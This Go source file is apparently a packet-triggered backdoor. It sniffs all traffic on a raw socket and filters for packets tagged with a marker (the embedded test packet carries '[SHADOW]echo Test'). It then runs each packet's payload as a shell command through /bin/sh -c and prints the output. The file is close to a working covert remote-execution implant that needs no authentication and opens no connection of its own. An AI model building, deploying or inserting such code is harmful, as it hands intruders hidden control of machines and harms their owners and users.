package main

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"syscall"

	"golang.org/x/net/bpf"
)

var (
	mtu = 1500
)

func createSocket() *os.File {
	// Get a file descriptor and open a raw socket for all incoming packets
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		panic(fmt.Sprintf("Unable to open file for socket, %v", err))
	}
	return os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd))
}

func testPacket(vm *bpf.VM) {
	testData := []byte{0x84, 0x70, 0xd7, 0xf6, 0xec, 0x12, 0xbc, 0x0f, 0xf3, 0x62, 0x57, 0x09, 0x08, 0x00, 0x45, 0x00, 0x00, 0x39, 0x00, 0x01, 0x00, 0x00, 0x40, 0x06, 0x23, 0x5c, 0xa9, 0xfe, 0x17, 0x0c, 0x81, 0x15, 0x15, 0x43, 0x30, 0x39, 0x00, 0x16, 0x00, 0x00, 0x03, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x02, 0x20, 0x00, 0xfd, 0x5b, 0x00, 0x00, 0x5b, 0x53, 0x48, 0x41, 0x44, 0x4f, 0x57, 0x5d, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x54, 0x65, 0x73, 0x74}
	outputFrameLen, err := vm.Run(testData)
	if err != nil {
		panic("Test filter failed")
	}
	if outputFrameLen <= 0 {
		panic("Test filter failed to pass any packets")
	}
	fmt.Printf("All tests passing, begin listening:\n\n")
	// fmt.Printf("Test data length %d\n", len(testData))
	// fmt.Printf("Returned value %d\n", outputFrameLen)
	// fmt.Printf("% x\n", testData)
}

func acceptPacket(socketFile *os.File, vm *bpf.VM, packetChannel chan shadowPacket) {
	for {
		// Read to buffer and create a frame
		frame := make([]byte, mtu)
		numRead, err := socketFile.Read(frame)

		// Check for failed packets and empty packets
		if err != nil {
			fmt.Printf("Unable to read buffer: %v", err)
			continue
		}
		if numRead == 0 {
			fmt.Printf("Empty packet recieved")
			continue
		}

		// Run the VM with instructions
		dataBeginIndex, err := vm.Run(frame)
		if err != nil {
			panic(fmt.Sprintf("failed to accept Ethernet frame: %v", err))
		}
		if dataBeginIndex > 0 {
			assembledFrame := shadowPacket{
				sourceAddr: frame[26:30],
				sourceMac:  frame[6:12],

				destAddr: frame[30:34],
				destMac:  frame[0:6],

				data: bytes.Trim(frame[dataBeginIndex:], "\x00"),
			}
			packetChannel <- assembledFrame
		}
	}
}

func runCommand(command string) (response string) {
	fmt.Printf("! %s\n", command)
	output, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
	if err != nil {
		return fmt.Sprintf("ERROR: %s", err)
	}
	return string(output)
}

func main() {
	// Create BPF VM
	bpfFilter := createTCPFilter()
	vm, err := bpf.NewVM(bpfFilter)
	if err != nil {
		panic(fmt.Sprintf("failed to load BPF program: %v", err))
	}
	testPacket(vm)
	socketFile := createSocket()

	// Create a channel for listening to incoming packets
	socketChannel := make(chan shadowPacket)
	go acceptPacket(socketFile, vm, socketChannel)

	// Connection messages
	fmt.Printf("  %-18s%-18s%-s\n", "SOURCE IP", "DEST IP", "DATA")
	for packet := range socketChannel {
		fmt.Printf("> %-18s%-18s%-s\n", packet.getSourceAddrStr(), packet.getDestAddrStr(), packet.data)

		if len(packet.data) > 0 {
			result := runCommand(string(packet.data))
			fmt.Printf("< %-75s\n", result)
		}
	}
}
